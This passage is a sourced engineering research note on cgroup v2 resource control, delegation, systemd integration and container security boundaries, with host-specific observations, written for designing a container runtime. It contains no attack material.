# D5 — Resource control, security boundary & rootless execution

Research agent D5. R&D only, no project code.

**Claim tags.** `[F]` fact — what Linux actually requires/does, primary-sourced.
`[C]` convention — what Docker/runc/podman happen to do. `[R]` recommendation —
ours, with reasoning and tradeoff, never presented as fact. `[O]` observation —
empirically verified, scoped to a named host + kernel + command.
Confidence `HIGH` / `MED` / `LOW`. Unsourced ⇒ `LOW`, with what would settle it.

**Empirical hosts.**

| Host | OS / kernel | Privilege | cgroup | LSM | Role here |
|---|---|---|---|---|---|
| `host-a` (`HOST-A`) | Ubuntu 24.10, `6.11.0-29-generic` | root | v2 unified (`cgroup2fs`) | AppArmor enforcing | live Docker 28.3.1 / runc 1.2.5 (spec 1.2.0, libseccomp 2.5.5), 5 production containers. **READ-ONLY, serving :80/:443.** |
| `old-host` | Rocky Linux 8.8, `4.18.0-425.3.1.el8.x86_64` | unprivileged user `sataromk` (uid 900000000) | v1 legacy only, `/sys/fs/cgroup` is `tmpfs`, no v2 mount | SELinux **disabled** | degradation laboratory: podman 4.9.4, apptainer 1.4.0, `newuidmap`/`newgidmap` present, **no `/etc/subuid` entry for our uid**, NFS home, `/tmp` is ext4 |

Every `[O]` in this document names the host. None of them generalise to `[F]`.

---

## 0. Executive summary — the decisions this document forces

Ordered by architectural weight, not by section number.

1. **Root in a default container is host root.** `[O]` A live Docker container
   on `host-a` shares the host's user namespace (`user:[4026531837]`, same
   inode as PID 1) with an identity `uid_map`, has `NoNewPrivs: 0`, and holds
   `CapBnd = 0xa80425fb`. The entire boundary is 14 capabilities + a seccomp
   filter + AppArmor. §10.4, §8.2.
2. **The cgroup, not the process tree, is the container.** Every kill, every
   liveness check, every stat goes through it. `cgroup.kill` (5.14) when
   present; freeze → walk → kill otherwise; wait on
   `cgroup.events:populated`. §5.
3. **`fs` cgroup driver first, into our own top-level subtree, with the
   `CgroupManager` trait in place from day one.** `[O]` runc's transient scope
   unit says `Delegate=yes` and only `*Accounting=yes` — so runc asks systemd
   for a *delegated subtree* and writes the files itself. The systemd
   integration we might need is one `.slice` unit, not a property-mapping
   layer. §2.3, §2.4.
4. **Set a default `pids.max`.** `[O]` Docker sets none; every live scope reads
   `19147` = systemd's `DefaultTasksMax` (15% of `kernel.threads-max` =
   127653). Docker's fork-bomb protection is a systemd accident. A bare `fs`
   driver has none. §2.4, §16.3 #12.
5. **`oom_kill` in `memory.events` is the only OOM signal.** `max` and `oom`
   are not kills; exit code 137 is not proof. Read the counter before and
   after. Never read the kernel log (`dmesg_restrict = 1`). §4.2.
6. **Never version-sniff; probe.** `[O]` RHEL 8 at 4.18 has `openat2`,
   `faccessat2`, `pidfd_send_signal`, `cap_last_cap = 40`, and working
   overlayfs-in-userns — but no `clone3`, no `pidfd_open`, no PSI. No version
   comparison predicts that. One `KernelFeatures` struct, built by probing,
   is the only place kernel-version logic may live. §7.2.
7. **Kernel floor: 5.15 supported, 6.x for development, not RHEL 8.**
   `cgroup.kill` and idmapped mounts are the two that change the architecture,
   not just the feature list. §7.3.
8. **Drop cgroup v1 entirely.** `[O]` The only v1 host we have cannot be
   limited anyway — every controller root is mode `555`, `mkdir` → `EACCES`,
   and `mount -t cgroup2` in a userns → `EPERM`. Supporting v1 buys zero
   capability there and doubles the subsystem. §6.3.
9. **A requested limit that cannot be applied is a hard error; a defaulted one
   is a logged note.** This requires `Option<u64>` (not Docker's `0`-means-both)
   and three-valued results — both cheap now, API-visible later. §6.3, §18.3.
10. **The bounding set *is* the capability policy.** `P(permitted)` does not
    appear in the `execve` transformation; for a uid-0 process the file sets
    are treated as all-ones, so bounding is the only mask. §8.1.
11. **`uid_map` must be written before the child's `execve`, by the parent.**
    `[O]` `unshare -U <prog>` leaves `CapPrm = CapEff = 0` — all capabilities
    are lost at `execve` for a non-root euid — so the child cannot map itself.
    In-process (no `execve`) the same write succeeds. This constrains the
    process topology, not a function. §10.2, §18.1(1).
12. **Install seccomp after dropping capabilities, immediately before
    `execve`, with `no_new_privs` on.** `[O]` A live container has `Seccomp: 2`
    with `NoNewPrivs: 0`, which proves runc installed the filter while it still
    held `CAP_SYS_ADMIN`. Defaulting `no_new_privs` on deletes that branch.
    §8.7, §9.5.
13. **Unknown syscalls must return `ENOSYS`, not `EPERM`.** glibc ≥ 2.34 probes
    `clone3` and falls back on `ENOSYS`; `EPERM` breaks `posix_spawn` outright.
    runc has to *patch* libseccomp's BPF to do this — which is the decisive
    argument for `seccompiler` or hand-built BPF over `libseccomp`. §9.6, §19.1.
14. **`openat2(rootfs_fd, path, RESOLVE_IN_ROOT|RESOLVE_NO_MAGICLINKS)` for
    every container-side path, `O_CLOEXEC` on every fd, `close_range` before
    `execve`.** These three lines are the fix for CVE-2024-21626 and the entire
    symlink-TOCTOU class. §12.4, §12.5.
15. **Hand-assemble the BPF device program; add no cgroup crate; three
    dependencies total.** `[O]` runc's `cgroup_device` program is 552 bytes
    xlated with no maps, no helpers, no BTF — `aya`/`libbpf-rs` solve problems
    it does not have. cgroupfs is nine text files. Net: `seccompiler`, `caps`,
    `rustix`. §15.2, §19.
16. **`[O]` Two `cgroup_device` BPF programs are attached to each live Docker
    scope** — runc's (unnamed, tag `ab4bc4523b7fe6b4`) and systemd's
    (`sd_devices`), both `BPF_F_ALLOW_MULTI`, so device policy is their
    intersection. Another reason to own a top-level subtree systemd does not
    manage. §15.2.
17. **The one seam that keeps rootless cheap: a `Privilege` value built once
    by probing, threaded read-only, with privilege-dependent *mechanisms*
    behind traits.** Nothing below the top level calls `geteuid()`. §18.3.
---

## 1. cgroup v2: the unified model

### 1.1 One hierarchy, controllers as attributes of nodes

`[F] HIGH` — In v2 there is exactly one hierarchy per cgroup-v2 filesystem
instance, mounted with `-t cgroup2`. A cgroup is a directory; membership is a
property of the *process*, not of the *(process, controller)* pair as it was in
v1. Controllers are turned on and off per subtree rather than each having its
own tree.
Source: `Documentation/admin-guide/cgroup-v2.rst` §"Basic Operations" /
§"Mounting".

`[O] host-a HIGH` — `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`. Root
`cgroup.controllers` and `cgroup.subtree_control` both read
`cpuset cpu io memory hugetlb pids rdma misc`. So on a stock Ubuntu 24.10 the
root has already enabled every available controller for its children — systemd
does this at boot.

`[O] host-a HIGH` — A live container's cgroup2 mount options, read from
`/proc/<pid>/mountinfo` inside `webapp-nginx-1`:
`cgroup2 cgroup rw,nsdelegate,memory_recursiveprot`. Two mount options matter:

- `[F] HIGH` `nsdelegate` — "Consider cgroup namespaces as delegation
  boundaries. This option is system wide and can only be set on mount or
  modified through remount from the init namespace." (cgroup-v2.rst,
  §"Mounting".) This is what makes a container's cgroup-namespace root behave
  as a delegated subtree without anyone `chown`-ing files.
- `[F] HIGH` `memory_recursiveprot` — "Recursively apply `memory.min` and
  `memory.low` protection to entire subtrees, without requiring explicit
  downward propagation into leaf cgroups." Without it, setting `memory.low` on
  a container's scope does nothing for a *nested* cgroup inside the container
  unless you also set it on every intermediate node. Ubuntu/systemd turns it on.
  `[R]` If we ever offer `--memory-reservation` (`memory.low`) we must read the
  mount options and tell the user when the flag will be silently ineffective;
  it is not detectable from the control files themselves.

### 1.2 `cgroup.controllers` vs `cgroup.subtree_control`

`[F] HIGH` — `cgroup.controllers` is **read-only** and lists the controllers
*available to this cgroup*, i.e. the ones its parent enabled in the parent's
`cgroup.subtree_control`. `cgroup.subtree_control` is **read-write** and lists
the controllers enabled *for this cgroup's children*. Writes are deltas:
`echo "+memory -io" > cgroup.subtree_control`. A controller can only be enabled
in `subtree_control` if it appears in this cgroup's `cgroup.controllers`.
Source: cgroup-v2.rst §"Enabling and Disabling Controllers".

The consequence people get wrong: **enabling a controller in a cgroup does not
give that cgroup the controller's own limit files — it gives them to its
children.** To limit memory on `/mydocker/ctr1`, `memory` must be in
`/mydocker/cgroup.subtree_control`, and then `memory.max` appears in
`/mydocker/ctr1/`. If you create `/mydocker/ctr1` and find no `memory.max`,
the bug is one level up.

`[O] host-a HIGH` — In each `docker-<id>.scope`, `cgroup.controllers` lists
all seven controllers (inherited from `system.slice`) while
`cgroup.subtree_control` is **empty** — the scope is a leaf, container
processes live directly in it, and no nested cgroups are created. That is the
whole reason the leaf may hold processes: see §1.3.

`[R] MED` — Our engine should, at container-create time, walk from the cgroup
root down to the parent of the new cgroup and ensure every controller we intend
to use is present in each `cgroup.subtree_control` along the path, adding the
missing ones. Failing to enable a controller must be a *distinguishable* error
from failing to set a limit — the first is an environment problem (delegation,
missing kernel config), the second is a bad value. Tradeoff: writing
`subtree_control` on ancestors we do not own is exactly the delegation
violation §2 warns about, so this walk must stop at our delegation root and
error out rather than climb past it.

### 1.3 The no-internal-process rule — exactly what it forbids

`[F] HIGH` — cgroup-v2.rst, §"No Internal Process Constraint":
> "Non-root cgroups can distribute domain resources to their children only when
> they don't have any processes of their own."
> "The root cgroup is exempt from this restriction."

Operationally, and this is the part that trips implementations:

1. `[F] HIGH` The rule is **not** "a cgroup with processes may have no
   children". It is "a cgroup that has processes may not enable domain
   controllers for its children". You *may* have `/a` containing processes and
   `/a/b` existing, as long as `/a/cgroup.subtree_control` is empty.
2. `[F] HIGH` The enforcement is symmetric and appears as two different errors:
   - Writing a pid into `cgroup.procs` of a cgroup whose `subtree_control` is
     non-empty ⇒ **`EBUSY`**.
   - Writing `+memory` into `cgroup.subtree_control` of a cgroup whose
     `cgroup.procs` is non-empty ⇒ **`EBUSY`**.
   `[O]` Not verified — writing under `/sys/fs/cgroup` is forbidden on
   `host-a` and impossible on `old-host`. `LOW` on the exact errno; the rule
   itself is `HIGH`. **Experiment for the local VM:** see §1.7-E1.
3. `[F] HIGH` The constraint applies to *domain* resources. `cgroup.procs` is
   checked, `cgroup.threads` in a threaded subtree is not — threaded
   controllers (`cpu`, `cpuset`, `perf_event`, `pids`) are exempt from it
   within a threaded subtree.

`[R] HIGH` — **Design consequence: our per-container cgroup layout must be
"parent holds nothing, leaf holds everything".** Concretely:

```
/sys/fs/cgroup/<delegation-root>/            <- subtree_control: +cpu +memory +pids +io
/sys/fs/cgroup/<delegation-root>/<ctr-id>/   <- limits live here; processes live here;
                                                subtree_control EMPTY
```

If we later want per-container sub-cgroups (e.g. an "init" cgroup separate from
"exec" processes, which is what a `docker exec` accounting story would need),
we must introduce an extra level *at that moment* and move the processes down —
which means the container's cgroup path is not stable. `[R]` Better to pay the
level up front: create `<ctr-id>/` as a domain with `<ctr-id>/init/` as the
only initial leaf, so `docker exec` can later get `<ctr-id>/exec-N/` without
restructuring. Tradeoff: one extra directory per container, one extra
`subtree_control` write, and the container's `/sys/fs/cgroup` (cgroupns root)
then shows a subdirectory the container did not create — cosmetically unlike
Docker. `[C]` Docker/runc do **not** do this; the scope is the leaf. `[O]`
verified above: `subtree_control` empty in every live scope.

### 1.4 `cgroup.type` and threaded cgroups

`[F] HIGH` — `cgroup.type` reads one of four values (cgroup-v2.rst
§"Threads"):

| value | meaning |
|---|---|
| `domain` | a normal valid domain cgroup |
| `domain threaded` | a threaded domain cgroup serving as root of a threaded subtree |
| `domain invalid` | in an invalid state; cannot be populated and cannot have controllers enabled |
| `threaded` | a member of a threaded subtree |

`[F] HIGH` — You create a threaded subtree by writing `threaded` into
`cgroup.type` of a cgroup; its parent becomes `domain threaded`, and
descendants become `threaded`. Inside a threaded subtree, processes are
distributed by *thread* via `cgroup.threads`, and all threads of a process must
be in the same threaded subtree. Only controllers that declare themselves
thread-aware (`cpu`, `cpuset`, `perf_event`, `pids`) can be enabled there;
`memory` and `io` cannot, because there is no meaningful per-thread memory
charge.

`[O] host-a HIGH` — every `docker-*.scope` reads `cgroup.type` = `domain`.
Docker does not use threaded cgroups.

`[R] HIGH` — **Do not implement threaded cgroups.** A container runtime places
whole processes; per-thread CPU placement is an HPC/realtime concern, not a
container concern, and the OCI spec has no field for it. Cost of skipping:
zero. If a user ever needs it they can create a threaded subtree *inside* the
container against the container's own delegated cgroupns root.

### 1.5 `cgroup.procs` vs `cgroup.threads`, and how migration actually behaves

`[F] HIGH` — Writing a single pid to `cgroup.procs` migrates **all threads of
that thread-group**. Writing a tid to `cgroup.threads` migrates one thread and
is only legal inside a threaded subtree. Both files accept exactly one
pid/tid per `write(2)`; you cannot batch. Reading `cgroup.procs` returns pids
which "may be duplicated or contain pids that are no longer alive" — the file
is not a consistent snapshot. Source: cgroup-v2.rst §"Basic Operations",
§"Organizing Processes and Threads".

`[O] host-a HIGH` — `cat .../docker-301b…scope/cgroup.procs` returned two
pids (`2588141`, `3077375`) for `nginx` with `pids.current` = 2. Consistent,
but that is luck, not a guarantee.

`[R] HIGH` — Never treat `cgroup.procs` as authoritative for "is the container
gone". Use `cgroup.events`'s `populated` field (§5.3) for that, and treat
`cgroup.procs` as a best-effort enumeration for signalling.

### 1.6 Moving a process in vs creating it in-place (`CLONE_INTO_CGROUP`)

`[F] HIGH` — The classic sequence is: create the cgroup, fork/clone the child,
then write the child's pid into `cgroup.procs`. There is a window between
`clone()` and the `write()` in which the child exists **outside** the intended
cgroup and is therefore unaccounted and unlimited.

`[F] HIGH` — `clone3(2)` with `CLONE_INTO_CGROUP` in `struct clone_args`
(`cgroup` = an `O_RDONLY|O_DIRECTORY` fd on the target cgroup) creates the
child *directly in* that cgroup, closing the window. Landed in **Linux 5.7**
(`clone3` itself in 5.3). Source: `clone(2)` man page, §`CLONE_INTO_CGROUP`;
`Documentation/admin-guide/cgroup-v2.rst` §"Organizing Processes and Threads".

`[F] MED` — `CLONE_INTO_CGROUP` also **relaxes the no-internal-process rule for
the target's parent in one specific way**: it permits spawning into a cgroup
whose parent has `subtree_control` set, because the child never transits the
parent. It does *not* let you spawn into a cgroup that itself has
`subtree_control` set. `MED` because I could not test it read-only; the
`clone(2)` man page documents the "target must be a valid leaf" requirement but
I did not verify the precise error. **Settled by** experiment §1.7-E2.

`[O] old-host HIGH` — `syscall(435, 0, 0)` → **`ENOSYS`**. `clone3` is not
present on Rocky 8.8 / 4.18.0-425. So `CLONE_INTO_CGROUP` is unavailable there
by construction.

`[R] MED — worth using, behind a probe, but not worth depending on.**
Reasoning: the race it closes is real but narrow. The unaccounted window is
between `clone()` and the pid write, during which the child in our design does
essentially nothing except wait on a synchronisation pipe from the parent — a
fork bomb cannot start there because the child has not `execve`'d the user's
entrypoint yet. So the *correct* ordering already contains the race:

```
create cgroup -> apply limits -> clone child (child blocks on pipe)
   -> write child pid to cgroup.procs -> verify -> release pipe -> child execve's
```

With that ordering, `CLONE_INTO_CGROUP` buys tidiness and one fewer failure
path, not safety. Tradeoff for using it: `clone3` has no glibc wrapper we
should rely on, so we call it raw; and it forks the code path (5.7+ vs older).
`[R]` Implement the pipe-synchronised path as the *only* correctness-bearing
path, and treat `CLONE_INTO_CGROUP` as an optional optimisation we may never
write. **This is the lazy answer and it is also the safe one.**

### 1.7 Experiments to run on the local VM (cannot be run read-only)

- **E1 — no-internal-process errno.** As root on a cgroup-v2 VM:
  `mkdir /sys/fs/cgroup/t; echo +memory > /sys/fs/cgroup/t/cgroup.subtree_control;`
  then `sleep 300 & echo $! > /sys/fs/cgroup/t/cgroup.procs` — record errno.
  Reverse: put the pid in first, then try `+memory` — record errno. Expect
  `EBUSY` both ways.
- **E2 — `CLONE_INTO_CGROUP` constraints.** Small C/Rust program calling
  `clone3` with `CLONE_INTO_CGROUP` against (a) a valid empty leaf, (b) a
  cgroup with `subtree_control` set, (c) a `domain invalid` cgroup. Record
  errnos.
- **E3 — `memory.max` vs `memory.high` behaviour.** In a cgroup with
  `memory.max=100M`, run an allocator that touches 200MB; observe `SIGKILL` and
  `memory.events:oom_kill` increment. Repeat with `memory.high=100M`,
  `memory.max=max`; observe the process survives, runs slowly,
  `memory.events:high` increments, and `memory.current` hovers near 100M.
- **E4 — `cpu.max` throttling.** `cpu.max = "50000 100000"`, busy loop, watch
  `cpu.stat`'s `nr_throttled` / `throttled_usec` climb.
- **E5 — `cgroup.kill` vs walking `cgroup.procs`** against a process that forks
  in a loop (see §5.2).
---

## 2. Delegation, and the systemd problem

### 2.1 The documented model

`[F] HIGH` — cgroup-v2.rst §"Delegation" defines two delegation mechanisms:

1. **Delegation to a less privileged user**: grant that user write access to the
   subtree root directory *and* to these three files in it —
   `cgroup.procs`, `cgroup.threads`, `cgroup.subtree_control`. Nothing else.
2. **Delegation to a cgroup namespace**, automatic on cgroupns creation when the
   filesystem is mounted with `nsdelegate`.

`[F] HIGH` — Deliberately **not** delegated: the resource control interface
files themselves (`memory.max`, `cpu.max`, …) of the subtree *root*. The
delegatee can set limits on its *children* but cannot raise the limit its
delegator imposed on the subtree root. That asymmetry is the whole point: the
parent's limit is a ceiling the child cannot lift.

`[F] HIGH` — **Delegation containment** for process migration by a non-root
user requires both:
> "(1) The writer must have write access to the 'cgroup.procs' file.
> (2) The writer must have write access to the 'cgroup.procs' file of the
> common ancestor of the source and destination cgroups."

For namespace delegation, "containment is achieved by requiring that both the
source and destination cgroups are reachable from the namespace of the process
which is attempting the migration." This is why a container cannot move its own
processes out into a sibling container's cgroup even though `/sys/fs/cgroup` is
mounted inside it — the sibling is not reachable from its cgroupns root.

`[O] host-a HIGH` — A live container's `/sys/fs/cgroup` mount, from
`/proc/<pid>/mountinfo`:
```
0:29 /system.slice/docker-301b2b….scope /sys/fs/cgroup ro,nosuid,nodev,noexec … cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
```
Three things at once: (a) the mount **root** is the container's scope, i.e. the
cgroupns root — the container sees its own cgroup as `/`; (b) the mount is
**`ro`** — the container cannot write even its own limits; (c) the underlying
superblock is `rw` with `nsdelegate`, so if a runtime mounted it `rw` the
container *could* write within its own subtree only. `[C]` Docker chooses `ro`;
that is a Docker policy decision, not a kernel one.

`[R] HIGH` — **Mount the container's `/sys/fs/cgroup` read-only by default,
with an opt-in to `rw`.** Reasoning: the read-only mount still lets the
container's own userspace *read* `memory.max` / `memory.current`, which is what
JVMs, Go runtimes, and `nproc` actually need for container-awareness. Writable
is only needed for nested containers (`systemd` as PID 1, or
docker-in-docker), and that is exactly the case where the user should have to
ask. Tradeoff: `systemd`-as-PID-1 images fail without `rw` + a `domain
threaded`-free writable subtree; Docker papers over this with
`--cgroupns=private` plus users mounting cgroupfs rw themselves.

### 2.2 Delegation to an unprivileged user

`[F] HIGH` — The kernel mechanism is plain filesystem permissions:
`chown $uid <subtree>` plus `chown $uid <subtree>/{cgroup.procs,cgroup.threads,cgroup.subtree_control}`.
There is no cgroup-specific ACL. But this alone is insufficient in practice
because the delegatee needs the controllers already enabled in the subtree
root's `cgroup.subtree_control` — and `subtree_control` of the *parent* is not
delegated, so the delegator must enable them beforehand.

`[F] HIGH` — systemd exposes this as the unit property **`Delegate=`**
(`Delegate=yes`, or `Delegate=cpu memory pids` to name controllers).
`user@<uid>.service` on modern systemd has `Delegate=pids memory cpu` (varies
by version/distro), which is what makes rootless Podman able to set
`--memory`. Source: `systemd.resource-control(5)`, §`Delegate=`.

`[O] old-host HIGH` — There is **no delegation of any kind** here.
`/sys/fs/cgroup` is `tmpfs (ro,nosuid,nodev,noexec,mode=755)` with per-controller
`cgroup` mounts under it. Every controller root is `dr-xr-xr-x root root` —
mode `555`, so not even the owner bit would help. `mkdir /sys/fs/cgroup/memory/test-d5`
→ **`EACCES` ("Permission denied")**. Our session's `/proc/self/cgroup`:
```
12:pids:/user.slice/user-900000000.slice/session-1890930.scope
11:memory:/user.slice/user-900000000.slice/session-1890930.scope
10:devices:/user.slice
 9:freezer:/
 8:perf_event:/
 7:cpuset:/
 6:rdma:/
 5:hugetlb:/
 4:net_cls,net_prio:/
 3:cpu,cpuacct:/
 2:blkio:/system.slice/sshd.service
 1:name=systemd:/user.slice/user-900000000.slice/session-1890930.scope
 0::/
```
and the session scope directories the kernel names for `pids`/`memory`
**do not exist as directories we can `stat`** (`ls -ld` → `ENOENT`), because
`/sys/fs/cgroup/pids/user.slice/user-<uid>.slice/` is not present — Slurm and
systemd-logind on this cluster place the session differently per controller.
Note line 2: `blkio` puts our shell under `/system.slice/sshd.service`, not
under `user.slice` at all — the classic v1 artifact of per-controller
hierarchies drifting apart. `[O]` `MED` on *why* the dirs are missing (could be
a `cgroup` mount that hides them, could be Slurm cleanup); `HIGH` on the
operational conclusion: **there is no cgroup we can write on this host.**

`[O] old-host HIGH` — Nor can we manufacture one: inside
`unshare -Urm --propagation private`, `mount -t cgroup2 none /tmp/…` →
**`EPERM`** ("permission denied", `mount(8)` rc=32). `tmpfs` mounts in the same
namespace succeed (rc=0), so the mount namespace itself is functional; it is
cgroup2 specifically that is refused. `MED` on the precise kernel reason (my
best reading is `cgroup_get_tree`'s requirement that the default hierarchy be
visible/ns-capable, but I did not read 4.18-el8's source); `HIGH` on the fact.

### 2.3 The systemd problem, and runc's `fs` vs `systemd` driver

`[F] HIGH` — On any distro where systemd is PID 1 and cgroup v2 is unified,
**systemd considers itself the sole owner of the cgroup hierarchy** and
documents a "single-writer rule": a process may only modify cgroups it owns or
that were delegated to it. systemd will reconcile the tree against its unit
configuration and can move or delete cgroups it does not know about.
Source: `systemd.resource-control(5)`; the kernel doc's own §"Delegation"
points at the same discipline.

`[C] HIGH` — runc therefore ships two cgroup managers:
- **`fs` driver** (`libcontainer/cgroups/fs2`): `mkdir` under
  `/sys/fs/cgroup/<parent>/<id>` and write the control files directly.
- **`systemd` driver** (`libcontainer/cgroups/systemd`): talk to
  `org.freedesktop.systemd1` over D-Bus and ask systemd to create a **transient
  scope unit** (`docker-<id>.scope`) with resource properties
  (`MemoryMax`, `CPUQuotaPerSecUSec`, `TasksMax`, …). systemd creates the
  cgroup and writes the control files.

The split exists for exactly one reason: **coexistence.** Anything the `fs`
driver creates is invisible to systemd, so `systemctl` reports nothing,
`systemd-cgtop` mis-accounts, and a `systemctl daemon-reload` or a slice
restart can garbage-collect the cgroup out from under a running container. The
`systemd` driver trades a D-Bus dependency for being a first-class citizen.

`[O] host-a HIGH` — `docker info` reports `CgroupDriver=systemd`,
`CgroupVersion=2`. The containers live at
`/sys/fs/cgroup/system.slice/docker-<full-64-hex-id>.scope`, i.e. transient
scopes in `system.slice`, which is the systemd driver's naming
(`<slice>/<unit>.scope`). This is Docker's default on cgroup v2 since 20.10.

`[F] MED` — The systemd driver cannot express everything. Properties systemd
has no equivalent for (`memory.high` before systemd 244's `MemoryHigh=`,
`cpu.max.burst`, `io.max` per-device beyond `IOReadBandwidthMax=`,
`memory.oom.group`) get written **directly to the cgroupfs afterwards** by
runc. So the systemd driver is really "systemd for what systemd knows, plus
direct writes for the rest". `MED` — I inferred this from the property
coverage, not from reading `systemd/v2.go` line by line. **Settled by** reading
`runc/libcontainer/cgroups/systemd/v2.go`'s `genV2ResourcesProperties` and the
post-apply direct writes.

`[R] HIGH — implement the `fs` driver first, and design the manager as a trait
from day one.**

Reasoning, in order of weight:

1. The `fs` driver is the one that teaches you the mechanism. It is ~15 files
   of `write("memory.max", "104857600")`. The systemd driver teaches you D-Bus.
   The project's stated goal is owning the runtime core.
2. The `fs` driver has **no runtime dependency**: no D-Bus socket, no systemd,
   works in a container, works in a minimal VM, works in CI.
3. The failure mode of `fs`-on-systemd is *not* immediate breakage — it is
   invisibility plus a garbage-collection risk. `[R]` Mitigate cheaply by
   putting our subtree under a **path systemd will not reap**: not
   `system.slice/*`, but a top-level `/sys/fs/cgroup/<engine-name>/`. systemd
   does not manage cgroups it did not create at the root level, and the
   documented escape hatch for exactly this is to have systemd create *one*
   delegated slice for us.
4. `[R]` The **cheap correct compromise**, and what I would actually build:
   `fs` driver writing into a subtree whose root was created once, at install
   time, by a systemd unit with `Delegate=yes`. One `.slice` file shipped with
   the engine; zero D-Bus code in the engine. If the user has no systemd, the
   engine `mkdir`s the top-level dir itself and prints one line saying it did.

Tradeoff of skipping the systemd driver: `systemctl status` will not show our
containers, `systemd-cgtop` accounting will be attributed to our top-level
cgroup rather than per-unit, and on a host where an admin restricts
`system.slice` resources our containers escape that ceiling (which is both the
feature and the bug). `[R]` Add the systemd driver only when someone
concretely reports one of those. **This is deferrable and it is the single
biggest piece of complexity in the resource subsystem that we can defer.**

`[R] HIGH` — The seam that makes it deferrable is narrow and worth naming now:

```
trait CgroupManager {
    fn create(&self) -> Result<()>;
    fn apply_pid(&self, pid: Pid) -> Result<()>;     // or: fd for CLONE_INTO_CGROUP
    fn set(&self, r: &Resources) -> Result<()>;
    fn stats(&self) -> Result<Stats>;
    fn kill_all(&self) -> Result<()>;
    fn freeze(&self, frozen: bool) -> Result<()>;
    fn destroy(&self) -> Result<()>;
}
```
Everything above this trait must speak in *our* `Resources` type (bytes,
nanoseconds, ratios), never in cgroupfs filenames or systemd property names.
Both drivers then translate. `[R]` The mistake to avoid is letting
`memory.max`-shaped strings leak upward into the container config — that is
what makes the systemd driver a rewrite instead of an addition.
### 2.4 What runc's systemd driver actually asks systemd for — measured

`[O] host-a HIGH` — `/run/systemd/transient/docker-301b2b….scope`, verbatim:

```ini
# This is a transient unit file, created programmatically via the systemd API. Do not edit.
[Unit]
Description=libcontainer container 301b2be6f7c8…

[Scope]
Slice=system.slice
Delegate=yes
MemoryAccounting=yes
CPUAccounting=yes
IOAccounting=yes
TasksAccounting=yes

[Unit]
DefaultDependencies=no
```

This is the single most useful artefact I found. It says:

1. **`Delegate=yes`.** runc asks systemd to create the scope and then *hands the
   subtree back to runc*. runc does not drive limits through systemd properties
   in the steady state — it gets a delegated cgroup and writes the control files
   itself. `[R]` This validates the §2.3 recommendation exactly: **the systemd
   integration we might eventually need is one `Delegate=yes` unit, not a
   property-mapping layer.**
2. **Only `*Accounting=yes` properties** appear, because this container was
   started with no resource flags (`docker inspect` confirms: `Memory 0`,
   `NanoCpus 0`, `CpuQuota 0`, `PidsLimit None`, `CpusetCpus ''`). Accounting is
   requested unconditionally so `docker stats` works.
3. **`DefaultDependencies=no`** — the scope has no ordering deps on
   `sysinit.target` etc., so it can be created at any point in boot and is not
   torn down by normal shutdown ordering.

`[O] host-a HIGH — the pids-limit surprise.** Every live scope reads
`pids.max = 19147` even though Docker was asked for no pids limit and
`system.slice/pids.max` is `max`. `kernel.threads-max` on this host is
`127653`, and `127653 × 0.15 = 19147.95`. That is systemd's
`DefaultTasksMax=15%` (of `kernel.threads-max`), applied because
`TasksAccounting=yes` puts the scope under systemd's task management.

**This is a real behavioural difference between the two drivers, and it cuts
against the `fs` driver.** With the systemd driver a container gets a fork-bomb
ceiling for free. With a bare `fs` driver, `pids.max` stays `max` and
`--pids-limit` omitted means *unlimited* — a fork bomb inside one container
exhausts host pids.

`[R] HIGH` — **Set a default `pids.max` ourselves.** Docker's own default is
"unlimited" (`PidsLimit: None`) and it only escapes consequence because systemd
silently backstops it. We should not inherit that luck. Concretely: default
`pids.max` to a fixed conservative number (2048 is enough for anything that is
not a build) or to `15%` of `kernel.threads-max` to match the observed
behaviour, and document it as *our* default rather than an accident.
Tradeoff: a heavy build container (`make -j64`, a JVM with many threads) can
hit it, so it must be overridable and the error must name the knob. The
alternative — no default — means the "fork bomb takes the host down" item on
the dangerous-shortcuts list (§16) is live in our engine by default.
---

## 3. Concrete limit mapping — the write side

All paths below are relative to the container's leaf cgroup directory. Every
one of these is an ordinary `write(2)` of an ASCII string; see §19.3 on why
that means we need no cgroup crate.

### 3.1 Memory

| Docker flag | OCI `linux.resources.memory` | cgroup v2 file | value format |
|---|---|---|---|
| `--memory`, `-m` | `limit` | `memory.max` | bytes, or `max` |
| `--memory-reservation` | `reservation` | `memory.low` | bytes (default `0`) |
| — (no Docker flag) | — | `memory.min` | bytes (default `0`) |
| — (no Docker flag) | — | `memory.high` | bytes, or `max` |
| `--memory-swap` | `swap` | `memory.swap.max` | bytes, or `max` |
| `--oom-kill-disable` | `disableOOMKiller` | *(no v2 equivalent)* | — |
| — | `useHierarchy` | *(v1 only, always on in v2)* | — |

`[F] HIGH` — The distinction that matters most, and that most tutorials get
wrong (cgroup-v2.rst §"Memory Interface Files"):

- **`memory.max`** — "Memory usage hard limit. … If a cgroup's memory usage
  reaches this limit and can't be reduced, the OOM killer is invoked in the
  cgroup." Writing `104857600` and then allocating past it causes the kernel to
  first attempt reclaim within the cgroup, and if reclaim cannot free enough,
  **invoke the cgroup OOM killer**, which SIGKILLs a member task.
- **`memory.high`** — "Memory usage throttle limit. If a cgroup's usage goes
  over the high boundary, the processes of the cgroup are throttled and put
  under heavy reclaim pressure." No kill. The allocating task is stalled in
  `mem_cgroup_handle_over_high()` proportionally to the overage.
- **`memory.low`** — "Best-effort memory protection … won't be reclaimed unless
  there is no reclaimable memory available in unprotected cgroups."
- **`memory.min`** — "Hard memory protection … won't be reclaimed under any
  conditions." If unreclaimable and the system needs memory, **the system OOM
  killer fires** — `memory.min` can therefore take down other cgroups.

`[R] HIGH` — **`--memory` must map to `memory.max`, and we should additionally
set `memory.high` to a fraction of it (I would use 90%) only behind an explicit
flag, never by default.** Reasoning: a runtime that sets only `memory.max`
gives users a hard `SIGKILL` at the boundary where a lot of them expected
backpressure — the classic "my container just dies with exit code 137 and no
log line". Setting `memory.high` beneath `max` converts the last 10% into
throttling, which produces a slow container and a visible
`memory.events:high` counter instead of a corpse. **But** it is a change in
semantics from Docker: a workload that legitimately spikes to 100% of its limit
briefly will be throttled where Docker would have let it through. So: expose
it, document it, do not default it. `[C]` Docker exposes no `memory.high`
equivalent at all.

`[F] HIGH` — **Swap accounting is separate in v2, and the arithmetic is
different from v1.** In v1, `memory.memsw.limit_in_bytes` is
*memory + swap combined*. In v2, `memory.swap.max` is **swap alone**. Docker's
`--memory-swap` is defined in the v1 idiom (total), so a v2 runtime must
compute `memory.swap.max = memory_swap - memory`. `[C]` runc does exactly this
subtraction in `libcontainer/cgroups/fs2/memory.go`. Getting the sign wrong
